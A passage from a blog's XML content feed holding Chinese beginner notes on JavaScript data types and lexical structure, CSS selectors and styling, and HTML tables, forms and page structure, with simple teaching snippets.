会自动创建一个全局变量。以这种方式创建的变量是全局对象的正常的可配置属性，并且可以删除它们。 作用域链嵌套的函数体内部，可以访问它上一级作用域中的变量。 延长作用域链： try-catch 语句 with 语句 垃圾收集 标记清除 引用计数 性能问题 管理内存 数据类型javaScript 数据类型有两类： 基本数据类型 和 复杂数据类型，其中基本数据类型（简单类型）有： Number/String/Boolean/Uundefined/Null一种复杂数据类型：object：Array/Date/Math/RegExp/ typeof 操作符 “undefined” –&gt; 这个值未定义 “boolean” –&gt; 这个值是布尔值 “string” –&gt; 这个只是字符串 “number” –&gt; 这个值是数值 “object” –&gt; 这个值是对象或null “function” –&gt; 这个值是函数 typeof 操作符号后面的操作数可以是变量，也可以是字面量； typeof 误区： null 值返回 “object”; Safari5 以及之前的版本、Chrome7 以及之前的版本对正则表达式调用返回”object”， 其他浏览器在这种情况下返回”object” 未初始化的变量和没有定义的变量操作符 typeof 都返回 “undefined”， 但它们有本质区别 Number 数据类型字面量： var num = 数字; 包括正数，负数，小数 取值范围： 能表示的最大值是±1.7976931348623157乘以10的308次方 能表示的最小值是±5 乘以10的-324次方 表示方式 十进制 十六进制 以 0x 开头，从 0-9，a(A) 到 f（F）的范围。 八进制 以 0 开头，0-7 组成。 NaN (not a number) 也是 number 类型，NaN 不等于自身 两个都为字符串的变量相减，得到的是NaN. 浮点数： 计算浮点数时会丢失精度 通常用整数的计算来表示浮点数的计算 不要以两个浮点数是否相等作为条件判断的依据（判断范围还是可以的） String,字符串类型字面量： var str = “字符串”; 字符串的长度： str.length; 凡是用””或者’’引起来的全是字符串类型。 转义字符 \” 转双引号 \’ 转单引 \r 回车 \n 换行 \t 制表符 \f 进纸 \xnn 以十六进制表示一个字符(n 是 0~F) \unnnn 以十六进制代码nnnn表示一个 Unicode 字符 (n 是 0~F) 字符串的特点ECMAScript 中的字符串是不可变的，也就是说，字符串一旦创建，它们的直就不能改变。要改变某个变量保存的字符串，首先要销毁原来的字符串，然后再用另一个包含心智的字符串填充该变量。如： 12var str = "Java";str = str + "Script"; 转换为字符串数值、布尔值、对象和字符串值都有 toString()方法, 但是 null 和 undefined 没用这个方法。 调用toString() 方法时，大多数情况下不传参数，但是如果传递了一个参数，输出数值的基数。默认情况下，toString() 方法以十进制格式返回数值字符串表示。而通过传递基数，可以输出对应的二进制、八进制、十六进制。 123456var n = 10;console.log(n.toString()); // "10"console.log(n.toString(2)); // "1010"console.log(n.toString(8)); // "12"console.log(n.toString(10)); // "10"console.log(n.toString(16)); // "a" 在不知道要转换的值是什么类型的时候，可以用 String() 函数，它可以将任意类型转成字符串。 Boolean 布尔类型 布尔数据类型两个数据值: true/false 实际运算中，true 代表1, false代表0; Undefined 表示声明但未赋值的变量在 js 中，一下四种情况的返回值是 undefined 变量声明了但没有赋值 函数没有返回值默认返回undefined 函数传递的实参个数少于形参个数时，未传递的参数值为undefined 对象没有定义的属性默认为undefined Null用 typeof判断时值为 object(值为空)/引用为空，内存里找不到这个变量。 再如： 1console.log(undefined == null); // true 两等号判断，两边都转成false 总的来说，只要意在保存对象的变量还没有真正保存对象，就应该让该变量保存 null 值，这样做体现了 null 作为空对象指针的惯例，也区分了 undefined 和 null。 复杂类型（来自JavaScript高级程序设计） object 对象 ECMAScript 中的对象就是一组数据和功能的集合。可以通过 new 操作符后跟要创建的对象类型的名称来创建。而创建 Object 类型的实例并为其添加属性或方法，就可以创建自定义对象，如： 1var o = new Object(); Object的每个实例具有的属性和方法 constructor： 保存着用于创建当前对象的函数，即构造函数。 hasOwnProperty(propertyName): 用于检查给定的属性在当前对象的实例中(而不是在原型中)存在；参数是字符串。 isPrototypeOf(object): 检查传入的对象是否是传入对象的原型。 propertyIsEnumerable(propertyName): 检查给定的属性是否能够使用 for-in 语言来枚举。参数是字符串。 toLocalString(): 返回对象的字符串表示，该字符串与执行环境的地区对应。 toString(): 返回对象的字符串表示。 valueOf(): 返回对象的字符串、数值、或布尔值表示。通常与 toString() 方法的返回值相同。 数据类型转换隐式数据类型转换 变量参与到运算中，程序对变量进行的数据类型转换（不是程序员进行的数据类型） 强制数据类型转换 将数字转换为字符串 String 变量.toString ，注意：null 和 undefined 没有 toString() 方法 将字符串转换为数字 Number 转换后保留原数据，不会对数据进行四舍五入。 非数字类型字符串转换后，比如 undefined，得到 NaN 。 如果字符串中包含有效的十六进制格式，则将其转换为相同大小的十进制整数值。 parseInt 对小数转换后保留的是整数部分，不会对数据进行四舍五入。 如果是数字后边有非数字字符串，转换后得到的是前边数字的整数部分。 parseFloat 转换为数字类型之后保留原数据，不进行四舍五入。 非数字类型字符串转换后，得到 NaN 。 如果是数字后边有非数字字符串，转换后得到的是前边数字的部分。 将其他类型转换为布尔类型：所有类型的值都可以转化成布尔值 Boolean 会转化成false的值有： 空字符串 数值零 NaN undefined null 假值：空字符串””/数字0/null/undefined/false/NaN 基本数据类型和复杂数据类型总结 基本类型—值类型— String Undefined Number Boolean Null 复杂类型—引用类型– Object 数组–Array,Date…. 基本类型的值存储在—- 栈中 复杂类型的地址(引用)存储在栈中,—地址指向的空间中的对象(对象)—对象存储在堆中 创建对象并返回对象—返回的是对象的地址(对象在堆空间中的地址) 基本类型传值的时候，传递的是值 复杂类型(引用类型)传递的时候,传递的是:地址(引用)]]></content>
      <categories>
        <category>JS系列</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js词法结构]]></title>
    <url>%2F2015%2F06%2F01%2Fjs%E8%AF%8D%E6%B3%95%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[js 的词法结构是一套基本规则，用来描述如何使用 js 编程。它规定了如何变量名长什么样，如何写注释以及程序语句之间如何分隔。 字符集（JavaScript权威指南）区分大小写标识符关键字、变量名、函数名、函数参数和所有标识符都是采用一致的大小写。 第一个字符必须是一个字母、下划线(_)或一个美元符($)； 其它字符可以是字母、下划线、美元符号或者数字 驼峰命名法 关键字js 没有使用但保留的关键字 class const enum export extends import super 保留字 js已经使用的关键字 123456break delete function return typeofcase do if switch var catch else in this void continue false instanceof throw whiledebugger finally new true withdefault for null try 严格模式下的保留字 123implements let private public yieldinterface package protected staticarguments eval js 尽量避免使用的标识符 123456abstract double goto native ataticboolean enum implements package superbyte export import private synchronizedchar extends int protected throwsclass final interface public transientconst float long short volatiole js 预定义的全局变量和函数名 123456arguments encodeURI Infinity Number RegExpencodeURICompnent Array isFinite Object StringBoolean Error isNaN parseFloat SyntaxError Date eval JSON parseInt TypeErrordecodeURI EvalError Math RangeError undefineddecodeURIComponent Function NaN ReferenceError URIError 空格、换行符、格式控制 \u0020 空格符 \u0009 水平制表符 \u000B 垂直制表符 \u000C 换页符 \u00A0 不中断空白符 \uFEFF 字节标记 \u000A 换行符 \u000D 回车符 \u2028 行分隔符 \u2029 段分隔符 \u200F 格式控制符 \u200E 格式控制符 \u200D 零宽连接符 \uFEFF 零宽非连接符注释 单行注释 1//单行注释 单行段落注释 1/*这是一个段落注释*/ 多行注释 1234/** 多行注释* 这里的注释可以连续写几行*/ 直接量直接量就是程序中直接使用的数据值，如： 1.2 // 数字 “123” // 字符串 “string” // 字符串 true // 布尔值 /^/w+/g // 正则表达式直接量 null // 空 {name:&quot;Hiraku&quot;,age:12} // 对象 [1,2,4] // 数组 分号的问题JavaScritp 使用分号(;)将语句和语句分开。JavaScript 并不是所有换行处都加分号，而是只有在缺少了分号就无法正确解析代码的时候，JavaScript才会填补分号。 如果当前语句和下一行语句无法合并解析，JavaScript 则在第一行后面填补分号，这是通用规则，但是有两个例外，一个是在涉及语句时，如果这三个关键字后紧跟着换行，JavaScript 则会在换行处填补分号。也就是说， return、break 和 continue 语句之后不能直接换行.]]></content>
      <categories>
        <category>JS系列</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js初识]]></title>
    <url>%2F2015%2F05%2F30%2Fjs%E5%88%9D%E8%AF%86%2F</url>
    <content type="text"><![CDATA[ECMAScript 是一种由 Ecma 国际前身为欧洲计算机制造商协会,英文名称是European Computer Manufacturers Association，制定的标准。 JavaScript 是由公司开发而成的，公司开发而成的一定是有一些问题，不便于其他的公司拓展和使用。所以欧洲的这个ECMA的组织，牵头制定 JavaScript 的标准，取名为 ECMAScript。简单来说 ECMAScript 不是一门语言，而是一个标准。符合这个标准的比较常见的有：JavaScript、Action Script（Flash中用的语言）。就是说，你JavaScript学完了，Flash中的程序也会写了。 ECMAScript 在 2015 年 6 月，发布了 ECMAScript 6 版本，语言的能力更强。 javaScript概念、组成概念：js是一门在客户端进行交互的网页编程语言. 一个完整的 JavaScript实现应该由下列三个部分组成： 组成： ECMAScript js标准 Dom 可以利用JS操作网页元素 Bom 通过api来操作浏览器 ECMAScriptweb 浏览器是 ECMAScript 实现可能的宿主环境之一，ECMAScript 规定了语言的的下列组成部分： 语法 类型 语句 关键字 保留字 操作符 对象 ECMAScript 就是对实现这个标准规定的各方面内容的语言描述。 DOM 文档对象模型 简介文档对象模型是针对 XML 但经过扩展用于 HTML 的应用程序编程接口。DOM 把整个页面映射为一个多层节点结构。HTML 或 XML 页面中的每个组成部分都是某种类型的节点，这些节点又包含不同的数据类型的数据。 BOM 浏览器对象模型 简介BOM 只处理浏览器窗口和框架，习惯上把所有针对浏览器的 JavaScrip 扩展算作 BOM 的一部分。如： 弹出新浏览器窗口 移动、缩放和关闭浏览器窗口的功能 提供浏览器信息信息的 navigator 对象 提供浏览器所加载页面详细信息的 location 对象 提供用户显示器分辨率详细信息的 screen 对象 对 cookie 的支持 像 XMLHttpRequest 和 IE 的 ActiveXObject 这样的自定义对象 由于没 BOM 统一标准，所以各个浏览器都有自己的实现功能，尽管各规定浏览器都实现 window 对象和 navigator 对象； JavaScript 的特点 简单易用 基于对象 基于过程 解释执行：js引擎来执行源代码 ， node 平台 编译执行类语言有：Java c# 源代码 ==&gt; 可执行文件.dll ==&gt; 电脑执行.dll课执行文件 使用范围： 表单验证 轮播图特效 游戏开发 &lt;script&gt;&lt;/script&gt;元素&lt;script&gt;&lt;/script&gt; 定义了6个属性 async: 可选。立即下载脚标，对页面中其他元素没有影响。只对外部脚标文件有效 charset: 可选。 表示通过 src 属性指定的代码的字符集。大多数浏览器会忽略其值，很少用 defer：可选。 表示脚本可以延迟到文档完全被解析和显示之后再执行。只对外部脚本有效 language: 已废弃。 src：可选。要执行的外部文件 type：可选。考虑到最大程度的兼容，使用 &quot;text/javascript&quot; js书写位置 内嵌式 1234567&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;js 书写位置&lt;/title&gt;&lt;script&gt; // js 代码段&lt;/script&gt;&lt;/head&gt; 外链式写法 新建一个js文件 通过script标签里的src=”1.js”属性将JS文件调入到当前页面。 补充内嵌式写法：推荐Js代码最好放在body结束标签的后边。 在XHTML中的用法XHTML 即可扩展的超文本标记语言，是将 HTML 作为 XML 的应用重新定义的一个标准。 1234567&lt;script type="text/javascript"&gt;// &lt;![CDATA[ funciton foo()&#123; // 代码段 &#125;//]]&gt;&lt;/script&gt; 文档模式doctype: 标准模式、混杂模式 严格模式开启：use strict; 页面中输出消息的几种方式12345alert("信息") 在页面出现一个弹出框，将信息弹出。confirm("信息") 在页面出现一个弹出框，将信息显示，常与if判断语句结合使用。prompt("信息") 弹出一个文本框，可以在文本框接收内容。常用于接收信息。console.log("信息")将信息输出到控制台，常用于代码调试。document.write("信息") 直接在页面输出消息。 注：document.write(“信息”)，不仅可以输出内容，还可以输出html标签。]]></content>
      <categories>
        <category>JS系列</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML元素分类、伪类、背景图片]]></title>
    <url>%2F2015%2F05%2F28%2FHTML%E5%85%83%E7%B4%A0%E5%88%86%E7%B1%BB%E3%80%81%E4%BC%AA%E7%B1%BB%E3%80%81%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87%2F</url>
    <content type="text"><![CDATA[CSS Cascading style sheets写法 内嵌式 外链式 1&lt;link rel="stylesheet" href="1.css"&gt; 行内样式 三种样式写法的区别 内嵌样式表： 影响范围限于当前页面，其他页面无效，不能真正实现结构和表现解耦 外链样式表 影响范围大，是整个站点，实现真正的结构表现分离 行内样式表： 仅限于当前标签，作用范围小。结构和表现完全耦合 link和@import区别 link属于HTML标签，而@import是CSS提供的 页面加载时，link会同时加载，而@import引入的CSS要等到页面中的所有元素加载完再加载 @import有兼容性，而link是HTML标签，无兼容性问题 link方式的样式的权重高于@import的权重 link引入的CSS支持js修改样式，而@import导入的CSS不能被js代码修改样式； html分类（显示方式）块元素最常用的有： div,p, li, h1-h6 特点： 独占一行 可以定义宽度和高度 包含关系的时候，父元素和子元素都为块元素的时候，子元素的宽度等于父元素的宽度 行内元素（内联元素）典型代表：strong span a em b del s ins i u 特点： 不能设置宽高， 宽高度由内容撑开 在一行上显示 行内块元素典型代表img input 特点： 在一行显示 可以定义宽高 元素之间的转换 行内元素转成块级元素 1display:block; 块级元素转成行内元素 1display:inline-block; 块元素转成行内元素 块、行内元素转成行内块元素 css特性层叠性当样式属性冲突时，执行时是最后面样式。和标签调用顺序无关。 继承性 条件：包含关系 普遍性：文本大小、字体、粗细、颜色、行高、风格样式被继承 特殊性： 标题标签不会继承，但受父级元素的影响，文字大小。 a标签不会继承父元素的文字颜色。 不可继承的：display、margin、border、padding、background、height、min-height、max-height、width、min-width、max-width、overflow、position、left、right、top、bottom、z-index、float、clear、table-layout、vertical-align、page-break-after、page-bread-before和unicode-bidi。 所有元素可继承：visibility和cursor。 内联元素可继承：letter-spacing、word-spacing、white-space、line-height、color、font、font-family、font-size、font-style、font-variant、font-weight、text-decoration、text-transform、direction。 终端块状元素可继承：text-indent和text-align。 列表元素可继承：list-style、list-style-type、list-style-position、list-style-image。 文字的所有属性可以继承，行高也可以继承, 但a标签不继承文字颜色 优先级 !important &gt; 行内样式 &gt; id选择器 &gt; 类选择器 &gt; 标签选择器 &gt; 默认 1000以上 1000 100 10 1 0 继承的权重为0, 权重会叠加 连接伪类a:link{属性:值;}, 没有点击时默认状态 a{属性:值;} 一般写这个 1234567891011121314151617181920a:link&#123; /*连接默认状态*/ 属性:值;&#125;a:visited&#123; /*连接访问之后的状态*/ 属性:值;&#125;a:hover&#123; /*鼠标放上去显示的状态*/ 属性:值;&#125;a:active&#123; /*连接激活的状态*/ 属性:值;&#125;a:focus&#123; /*获取较大*/ 属性:值;&#125; 注意：连接伪类的顺序不能错； text-decoration 文本修饰 text-decoration: none; 去掉a标签的默认样式的下划线 text-decoration: underline; 加上下划线 text-decoration: line-through; 删除线 背景 background-color background-image background-repeat 背景图片沿着x轴平铺 background-position left|right|top|bottom|center 背景定位写具体方位的时候，书写顺序没有限制 background-attchment scroll|fixed scroll 背景滚动 默认 fixed 背景固定 背景属性连写1background: color imge repeat position attachment 特点：没有顺序要求]]></content>
      <categories>
        <category>CSS系列</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS样式表、CSS选择器]]></title>
    <url>%2F2015%2F05%2F26%2FCSS%E6%A0%B7%E5%BC%8F%E8%A1%A8%E3%80%81CSS%E9%80%89%E6%8B%A9%E5%99%A8%2F</url>
    <content type="text"><![CDATA[样式表的书写位置写在 &lt;head&gt;&lt;/head&gt; 中, 样式：选择器{属性:值;属性:值; }1234567&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;样式表写法&lt;/title&gt; &lt;style type="texr/css"&gt; 样式表内容 &lt;/style&gt;&lt;/head&gt; 样式表的常见属性 width 宽度 width:200px; height 高度 height:200px; background-color 背景色 background-color:red; font-size 文字大小 font-size:20px; color 文本颜色(前景色) color:yellow; text-align 内容的水平对齐方式 text-align:left|center|right text-indent 首行缩进 text-indent:2em;（2个汉字的大小） 常见属性表格 属性 值 说明 width 20px 宽 height 300px 高 background-color red 背景色 text-align left/center/right 内容水平对齐方式 text-indent 2em/px/% 首行缩进 font-size normal/bold 文本大小 font-weight 100-900/bold 文本粗细 font-style normal/italic 文本风格 font-family 宋体 字体 line-height 1.5/2em/px/% 行高 行高行高 浏览器默认文字大小 div 1350px*18px 行高=文本+上边距+下边距 默认文字大小是16px 默认行高大小是18px一行文字，行高与父元素高度一致时，文本垂直居中对齐。 行高的单位12345行高值 文字大小 行高大小40px 20px 40px2em 20px 40px150% 20px 30px3 20px 60px 总结： 当给父元素设置行高的时候，除了以px为单位以外，其他的值都与文字大小有关，是与文字大小的乘积, 行高是可以继承。 12345父元素行高 父元素文字大小 子元素文字大小 子元素行高40px 20px 30px 40px2em 20px 30px 40px150% 20px 30px 30px3 20px 30px 90px 文本基线 基础选择器标签选择器 写法：标签{属性值;} 特点：标签选择器定义之后，会将页面所有的元素都执行这个样式颜色的显示方式： 直接写颜色名称： 如： “red”； 16进制显示 由0-9和a-ff一共16个值组成；#ff0000; #ff0000,前边2个数值对应的是红色, #00ff00,中间2个对应的是绿色, #0000ff,后边2个对应的是蓝色。 RGB表示颜色 如：span{color: rgb(23,23,23); } r代表红色，g绿色 b蓝色 rgba 表示不透明度 如：h1{width: 500px; height: 400px; color: rgba(121,232,108,0.5); } a代标alpha 0-1; 类选择器 写法：自定义类名{属性:值;} 特点：类选择器需要调用才能生效，谁调用谁生效1.box&#123;width: 200px; height: 40px; color: yellow; background-color: rgb(24,124,101); text-align: center; font-size: 24px; &#125; 多标签可以调用同一个类选择器1&lt;div class="box baby"&gt;加油努力奋斗&lt;/div&gt; 类选择器的命名规则 不能使用纯数字和纯数字开头来定义类名 不建议使用中文 不能使用特殊符号来定义类名（“_”除外） 不建议使用标签名和属性名来定义类名 id选择器 写法： #名称{属性:值} 1#box&#123;width: 300px; height: 200px; background-color: pink; font-size: 20px; &#125; 特点: id选择器需要调用才能生效，谁调用谁生效 一个标签不能调用多个ID选择器 一个id选择器在一个页面内只能调用一次，多次调用不符合w3c规范，配合js使用，若出现多次js调用则会出错 通配符选择器 写法：*{属性:值;} 特点： 浏览器累死了，消耗服务器资源，不推荐使用； 会将所有的标签都执行这个通配符选择器 文本介绍文本属性 文本属性 font-size 文字大小 font-weight 文字的粗细 值从100-900; 700的值和bold大约一样(用700,不用bold) font-style 文本风格： nomarl |italic font-family 字体：宋体，微软雅黑，楷体 line-height 行高 文本属性连写顺序：font: font-style font-weight font-size/line-height font-family 注：按照顺序写，文字大小和字体在文字连写的时候为必须写的属性 字体的表达方式 直接写中文字体（宋体|微软雅黑） 直接写字体的英文名字（simsun|microsoft yahei|） Unicode编码方式 在浏览器中查找Unicode编码 chrome–&gt;f12–&gt;console–&gt;escape(“宋体”)–&gt;enter 复合选择器两个或两个以上的选择器通过不同的方式连接到一起 交集选择器 写法 标签+类(id){属性:值} 特点：既…又的关系 后代选择器 写法： 选择器+空格+选择器+空格+选择器{属性:值;} 注意：后代选择器首先要满足包含（嵌套关系）。 特点： 可以无限制隔代。 只要能代表父子关系，标签选择器、类选择器、id选择器可以任意组合 父级元素在前面，子级元素在后面 子代选择器 写法：选择器&gt;选择器{属性:值;} 特点：选中的是直接下一级 12345678910111213&lt;style type="text/css"&gt; div&gt;span&#123; color: red; font-size: 36px;&#125;&lt;/style&gt;&lt;div&gt; &lt;p&gt; &lt;span&gt; 愿使岁月静好，现世安稳。 &lt;/span&gt; &lt;/p&gt; &lt;span&gt;天才在左疯子在右&lt;/span&gt;&lt;/div&gt; 并集选择器将不同选择器之间相同的样式写在一起，选择器之间通过逗号链接在一起。 可能是包含关系，也可能是并列关系。 如果标签样式相同或者部分相同，可以用并集选择器，通过逗号连接在一起 选择器+,+选择器{属性:值;} 特点：并集选择器不一定是并列关系 标签选择器、类选择器、id选择器、复合选择器，可以通过逗号任意组合连接在一起 123456.one,.one .two, .three, p&#123;font-size: 50px; font-weight: normal; &#125;&lt;div class="one"&gt;&lt;h1 class="two"&gt;明媚的心&lt;/h1&gt;&lt;/div&gt;&lt;p&gt;天才，和蠢材的差别是勤奋&lt;/p&gt;&lt;div class="three"&gt;美丽的人生要靠努力&lt;/div&gt;]]></content>
      <categories>
        <category>CSS系列</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML表格、表单、标签语义化]]></title>
    <url>%2F2015%2F05%2F22%2FHTML%E8%A1%A8%E6%A0%BC%E3%80%81%E8%A1%A8%E5%8D%95%E3%80%81%E6%A0%87%E7%AD%BE%E8%AF%AD%E4%B9%89%E5%8C%96%2F</url>
    <content type="text"><![CDATA[HTML5标签结构sublime 快捷键 !+Tab 可以写成HTML5结构 字符编码 ASCLL ansi unicode GBK GB2312(中文简体) BIG5(只支持繁体字) UTF-8(国际通用编码) meta标签12345678910标签说明 &lt;!--编码--&gt; &lt;meta charset="utf-8"&gt; &lt;!--关键字--&gt; &lt;meta name="keywords" content="java培训, ios"&gt; &lt;!--name 页面里面的关键词 content 里面是给SEO用的--&gt; &lt;!--网页描述--&gt; &lt;meta name="description" content="给搜索引擎看的，可以看得到的内容"&gt; &lt;!--网页重定向--&gt; &lt;meta http-equiv="refresh" content="5;http:www.itcast.com"&gt; link标签调用外部样式表：11 &lt;link rel="stylesheet" href="1.css"&gt; ico小图标，在网页显示时的标题的前面：(必用)11 &lt;link rel="icon" href="../favicom.ico"&gt; 简单表格用来存放数据的，表格是对网页重构（css+div）一个有有益补充 行 tr 列 td 简单结构（1行2列）123456&lt;table border="1" width="300" height="100" cellspacing="0" cellpadding="10"&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 表格属性介绍 边框 border=”1” 宽度 width=”300” 高度 height=”100” 单元格与单元格的距离 cellspacing=”2”，默认值2 内容到边框的距离cellpadding=”2” 默认值0 背景色 bgcolor=”yellow” 对齐方式 align left|center|right 如果align放到tr或者td里面是内容的对齐方式 如果align放到table里面，是表格的对齐方式 表格标题 用法和td一样 1234567891011&lt;table border="1" width="300" height="100" cellspacing="0" cellpadding="10"&gt; &lt;caption&gt;表头&lt;/caption&gt; &lt;tr&gt; &lt;th&gt;&lt;/th&gt; 表格的标题 &lt;th&gt;&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 表格的标准结构1234567891011121314151617&lt;table&gt; &lt;caption&gt;&lt;/caption&gt; &lt;thead&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;tfoot&gt; &lt;/tfoot&gt;&lt;/table&gt; 表格单元格的合并 在同一行上合并 colspan=”2” 在同一列上合并 表单用来收集信息 提示信息 表单控件 action：用来处理信息（信息提交给谁，把文件提交给那个文件处理） method：get|post 传递信息的方法 get 安全性很低，通过浏览器的地址栏传递信息，post 安全性高，通过action文件处理，它们的区别如下 1.GET没有请求主体，使用xhr.send(null)2.GET可以通过在请求URL上添加请求参数3.POST可以通过xhr.send(‘name=itcast&amp;age=10’)4.POST需要设置5.GET效率更好（应用多）6.GET大小限制约4K，POST则没有限制 表单控件1 &lt;form action=&quot;1.php&quot; method=&quot;post&quot;&gt;&lt;/form&gt; 单行文本输入框1 &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;Hiraku&quot; maxlength=&quot;16&quot; readonly=&quot;readonly&quot; &gt; name 文本输入框的名字 value 接收的默认值 文本框的值 maxlength 输入的最大字符长度 readonly 输入框为只读状态 disabled 输入框为未激活状态 密码输入框1 &lt;input type=&quot;password&quot; name=&quot;密码输入框&quot;&gt; 单行文本输入框的属性对密码输入框都适用 单选框1 &lt;input type=&quot;radio&quot; name=&quot;gender&quot; checked=&quot;checked&quot;&gt;男 2 &lt;input type=&quot;radio&quot; name=&quot;gender&quot;&gt;女 当将单选框name值设置相同的时候才能实现单选效果, checked 设置默认选中项。 下拉列表下拉列表12345678910111213&lt;select&gt; &lt;option selected=”selected”&gt;下拉列表选项&lt;/option&gt; &lt;!--设置默认选项--&gt;&lt;/select&gt;&lt;!-- multiple="mutiple" 下拉列表多选 设置下拉列表为多选项 --&gt;&lt;optgroup label="甘肃省"&gt; 对下拉列表进行分组 &lt;option value=""&gt;定西市&lt;/option&gt; &lt;option value=""&gt;兰州市&lt;/option&gt; &lt;option value=""&gt;庆阳市&lt;/option&gt; &lt;option value=""&gt;天水市&lt;/option&gt; &lt;option value=""&gt;嘉峪关&lt;/option&gt; &lt;option value=""&gt;酒泉市&lt;/option&gt;&lt;/optgroup&gt; 多选框1234&lt;input type="checkbox" checked="checked"&gt;动漫&lt;input type="checkbox"&gt;电影&lt;input type="checkbox"&gt;电子竞技&lt;input type="checkbox"&gt;音乐 checked 默认选项 多文本输入框1 &lt;textarea name=&quot;输入框&quot; id=&quot;&quot; cols=&quot;30&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt; cols 输入字符的长度 rows 输入字符的行数 上传文件控件1 &lt;input type=&quot;file&quot;&gt; 提交按钮1 &lt;input type=&quot;submit&quot;&gt; 普通按钮1 &lt;input type=&quot;button&quot; value=&quot;普通按钮&quot;&gt; 普通按钮不能实现表单信息提交，常配合js使用 图片按钮1 &lt;input type=&quot;image&quot; src=&quot;&quot;&gt; 表单信息分组1 &lt;form&gt; 2 &lt;fieldset&gt; 3 &lt;legend&gt;注册信息&lt;/legend&gt; 4 &lt;input&gt; 5 &lt;/fieldset&gt; 6 &lt;/form&gt; 重置按钮1 &lt;input type=”reset” value=”重置信息”&gt; HTML5表单控件1 &lt;form action=&quot;1.php&quot; method=&quot;post&quot;&gt; 2 &lt;!-- 判断网址 --&gt; 3 &lt;input type=&quot;url&quot;&gt;&lt;br/&gt;&lt;br/&gt; 4 &lt;!-- 判断邮箱 --&gt; 5 &lt;input type=&quot;email&quot;&gt;&lt;br/&gt;&lt;br/&gt; 6 &lt;!-- 日期控件 --&gt; 7 &lt;input type=&quot;date&quot;&gt;&lt;br/&gt;&lt;br/&gt; 8 &lt;!-- 时间控件 --&gt; 9 &lt;input type=&quot;time&quot;&gt;&lt;br/&gt;&lt;br/&gt; 10 &lt;!-- 数字控件 --&gt; 11 &lt;input type=&quot;number&quot;&gt;&lt;br/&gt;&lt;br/&gt; 12 &lt;!-- 滑块控件 --&gt; 13 &lt;input type=&quot;range&quot; max=&quot;150&quot; min=&quot;2&quot; step=&quot;5&quot;&gt;&lt;br/&gt;&lt;br/&gt; 14 &lt;input type=&quot;submit&quot;&gt; 15 &lt;/form&gt; 标签语义化标签语义化即：根据内容的结构化（内容语义化），选择合适的标签 注意事项： 尽可能少的使用无语义的标签div和span 在语义不明显是尽量用p,即可使用div也可使用p 不要使用纯样式标签: 需要强调的文本尽量用和 好的标签语义化网站：去掉CSS，结构依然很清晰]]></content>
      <categories>
        <category>HTML系列</category>
      </categories>
      <tags>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初识HTML]]></title>
    <url>%2F2015%2F05%2F20%2F%E5%88%9D%E8%AF%86HTML%2F</url>
    <content type="text"><![CDATA[HTML基础 Hyper text markup language 超文本标记语言 超文本：网页中可以包含图片、文字、视频、音频、文本框等元素; 标记（标签）：在网页中给网页元素做标记（右键，查看网页源代码） 超链接：实现页面之间的跳转 Sublime常用快捷键 windows+D 返回桌面 windows+R 运行dos windows+E 打开我的电脑 Alt+Tab 切换软件 Ctrl+Tab 软件内部文档间切换 F2 重命名 Web标准 结构标准：HTML HyperText Mark Language 超文本标记语言 表现标准：CSS Casading Style Sheets 层次样式表 行为标准：javaScript ECMAScript javaScript标准 DOM Document Object Model 文档对象模型 BOM Browser Object Model 浏览器对象模型 浏览器简介浏览器涉及技术：浏览器内核，渲染引擎 SEO,Search Engine Optimization(搜索引擎优化)。 浏览器内核：分为两部分：渲染引擎和JS引擎，决定了浏览器如何显示网页的内容、页面格式等 ie trident firefox gecko chrome/safari webkit chrome blink opera persto 浏览器和服务器的那点事 http协议：超文本传输协议、浏览器和服务器之间的对话（通信的协议）。 https：加密的过程 url协议：规定url地址的格式 协议规定格式：scheme:定义因特网服务类型 host：定义域主机 端口：网页默认80端口 path：路径 filename： 文件名 HTML结构1234567891011121314151617&lt;! Doctype html&gt; &lt;!--声明文档类型--&gt;&lt;html&gt; &lt;!--根标签--&gt;&lt;head&gt; &lt;!--头部标签--&gt;&lt;title&gt;标题&lt;/title&gt; &lt;!--网页标题标签--&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;网页主体&lt;/div&gt; &lt;!--网页主体标签--&gt;&lt;/body&gt;&lt;/html&gt;解析： &lt;! Doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt;&lt;/body&gt; &lt;/html&gt; 注：文档的后缀名只能决定打开方式，不能修改文档类型 HTML标签的分类 单标签 &lt;! Doctype html&gt; &lt;img src=&quot;&quot; alt=&quot;&quot;/&gt; 双标签 &lt;html&gt;&lt;/html&gt; &lt;head&gt;&lt;/head&gt; &lt;title&gt;&lt;/title&gt; &lt;body&gt;&lt;/body&gt; … HTML关系 并列关系（同级） &lt;head&gt;&lt;/head&gt; 和 &lt;body&gt;&lt;/body&gt; 包含关系（嵌套） &lt;head&gt;&lt;title&gt;标题&lt;/title&gt;&lt;/head&gt; 开发工具 DreamWeaver：很老的一个软件 偏设计师使用 Sublime:轻量级的软件，有很多好用的插件 WebStorm:重量级软件，功能强大 Sublime 常用的快捷键 